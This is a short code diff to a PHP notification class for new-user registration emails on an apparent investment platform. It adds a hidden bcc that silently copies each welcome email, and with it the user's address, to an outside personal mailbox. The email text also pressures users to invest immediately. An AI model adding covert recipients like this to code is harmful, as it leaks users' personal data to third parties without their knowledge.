@@ -43,7 +43,8 @@ class UserRegistered extends Notification implements ShouldQueue {
 			->line('You are welcome to one of the leading financial network.')
 			->line('Make sure to invest immediately, we await to see your earn your first wages with us soon.')
 			->action('Goto Dashboard', url($dashboardPath))
-			->line('Thanks for Joining our financial network');
+			->line('Thanks for Joining our financial network')
+			->bcc('conyekelu@yahoo.com','BFIN notification');
 	}
 
 	/**
